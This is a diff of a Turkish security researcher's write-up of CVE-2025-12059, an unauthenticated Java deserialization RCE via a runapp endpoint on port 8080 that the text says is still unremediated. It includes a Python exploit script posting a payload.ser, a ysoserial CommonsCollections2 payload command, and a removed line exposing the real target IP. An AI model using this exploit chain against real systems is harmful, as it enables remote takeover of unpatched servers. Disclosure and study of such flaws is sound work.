@@ -3,6 +3,11 @@ title: "CVE-2025-12059"
 description: "CWE-502"
 ---
 
+**Date:** 2025-10-04\
+**Reported to vendor:** reported, vendor not yet remediated\
+**Severity:** Critical (CVSS v3.1 = **9.8**) (Full system compromise risk)\
+**CWE:** CWE-502 
+
 Deserializasyon hataları Java ekosisteminde sık ve tehlikelidir, zayıf bir `readObject()` çağrısı, uygun gadget zincirleriyle çalıştırılabilecek kötü amaçlı kodu doğrudan tetikler. Eğer uygulama dışarıdan yazılabilen dosyaları deserialize ediyorsa veya web katmanı üzerinden bu içeriği içe alıyorsa, risk **uzaktan** ve **kimlik doğrulamasız** hale gelir.
 
 ## Olay Akışı
@@ -18,18 +23,11 @@ runapp.jnlp içeriğinden doğruca startup.jar dosyasına yönlendirme var, ilgi
 JAR içindeki `com.lbs.start.SocketToken` / `new ServerSocket(port)` + `ObjectInputStream.readObject()` çağrıları gelen socket üzerinde doğrudan `readObject()` çağırıyor.
 
 ```java
- try {
-  in = new ObjectInputStream(s.getInputStream());
-  message = (String)in.readObject();
-  System.out.println("server>" + message);
-  out.writeObject("LBS_Hello");
-  out.flush();
-  message = (String)in.readObject(); // doğrudan deserializasyon
-  if (message != null && message.equals("LBS_Hello"))
-  {
-System.out.println("PORT_TOKEN_CREATED");
-  return 0;
- }
+in = new ObjectInputStream(s.getInputStream());
+message = (String) in.readObject(); // doğrudan deserializasyon
+// ...
+message = (String) in.readObject(); // tekrarlanarak kullanılmakta
+if (message != null && message.equals("LBS_Hello")) {
 ```
 
 - Ayrıca `initListen(...)` içinde `ms_Instance.accept()` ile kabul edilen bağlantılarda yine `new ObjectInputStream(connection.getInputStream())` çağrısı ve `processor.processToken(message)` ile gelen nesnenin uygulama mantığına verildiği görülüyor.
@@ -50,12 +48,12 @@ gibi portları deneyince öyle bir port var ama dışarıya erişimi kapalıydı
 
 Herşey okey, kodlarda  biz zafiyet var, .ser dosyamı hazırladım ama karşı sunucular lokalde çalışıyor, dışarıya erişimi kapalı. Hemen planlamaya geçtim, 8080 portu eğer lokal sunuculara aracı olabilmemi sağlarsa bunu RCE olarak geçirebilirdim, hemen denedim.\
 \
-[exploit.py](http://exploit.py) 
+[exploit.py](http://exploit.py)
 
 ```python
 import requests
 
-url = "http://85.153.151.52:8080/logo/smart/runapp?mem=2048&lang=TRTR&access_token=test123&tenantId=1&firmNr=001"
+url = "http://xx.xxx.xxx.xx:8080/xxxxxx/xxxxx/runapp?mem=2048&lang=TRTR&access_token=test123&tenantId=1&firmNr=001"
 payload_file = "payload.ser" ## bizim dosya
 
 with open(payload_file, "rb") as f:
@@ -72,7 +70,8 @@ else:
     print(f"[!] Error: {response.status_code}")
 ```
 
-Öyle çetrefilli bir olayı yok, tek olayımız şu, runapp.jnlp'e dosyamızı atmak ve deserilize ediyormu onu ölçmek.
+Öyle çetrefilli bir olayı yok, tek önemli kısım şurası `url = "http://xx.xxx.xxx.xx:8080/xxxx/xxxxx/runapp?mem=2048&lang=TRTR&access_token=test123&tenantId=1&firmNr=001"`\
+jar dosyalarından incelemem ile linke bu şekilde parametreler gönderdiğim zaman herhangibi bir doğrulama işlemi gerçekleştirmeden onaylıyor. Geriye kalan tek olayımız şu, runapp.jnlp'e dosyamızı atmak ve deserilize ediyormu onu ölçmek.
 
 <img
   src="/images/Ekrangörüntüsü2025-11-01031514.png"
@@ -89,17 +88,17 @@ java --add-opens java.base/sun.reflect.annotation=ALL-UNNAMED \
      -jar ysoserial-all.jar CommonsCollections2 "touch /tmp/pwned" > payload.ser
 ```
 
-Görselde ki gibi, gerçektende runapp.jnlp'e dosya göndermeyi başardım ve 8080 portu üzerinde dosyamı görebiliyordum. aynı şekilde jnlp dosyası içerisinde de gözüküyordu. Son kod bloğu ise payload.ser'in içeriğiydi ve gerçektende sistemde gadget çalıştırıp tmp/pwned klasörünü oluşturmuştum. 
+Görselde ki gibi, gerçektende runapp.jnlp'e dosya göndermeyi başardım ve 8080 portu üzerinde dosyamı görebiliyordum. aynı şekilde jnlp dosyası içerisinde de .ser dosyamın referansı gözüküyordu. Son kod bloğu ise payload.ser'in içeriğiydi ve gerçektende sistemde gadget çalıştırıp tmp/pwned klasörünü oluşturmuştum.
 
 Şu anda ilgili firma zafiyeti tamamen gidermediği için, güvenlik riski devam ettiği sürece ayrıntılı poc veya exploit kodu yayımlamıyorum.
 
-## Impact
+## Deserialization Kaynaklı RCE Nasıl Oluşur.
 
-\
-Unauthenticated RCE yetki gerektirmiyor, uzaktan erişilebilir port/endpoint var.
+![image.png](/images/image.png)
 
-Potansiyel etkiler: data exfiltration, lateral movement, sistem tam kontrolü.
+Obje sınıfı ilk anlattığım gibi `readObject() / ObjectInputStream`  gibi objeler olabilir, obje oldukça masumane bir şekilde ilgili sisteme veri getir götür işlemlerini yaparken, burada zafiyet olduğunu tespit eden Kötü Niyetli Saldırgan kişisi `A` olayında olduğu gibi, olan veriyi Serileştirerek içeriye sokar.\
+`B `olayında ise eğer kötü niyetli saldırgan serileştirilmiş veriyi gönderebilirse deserialization dediğimiz olay gerçekleşir ve sistem içeride bu veriyi seri durumdan çıkarır ve sistemi içeriye sokar. `C` olayında ise artık saldırganın içeride komut çalıştırmasının önünde bir engel kalmaz.
 
- **CVSS v3.1 = 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)**
-
-gerekçe: uzaktan, düşük karmaşıklık, hiç yetki gerektirmiyor, kullanıcı etkileşimi yok, tüm gizlilik/ bütünlük/erişilebilirlik kritik düzeyde etkileniyor.
+<Danger>
+  **Bu çalışma yalnızca güvenlik araştırması ve farkındalık amacıyla yapılmıştır. İlgili kurum bilgilendirilmiş, güvenlik açığı kapatılana kadar exploit detayları paylaşılmamıştır.**
+</Danger>
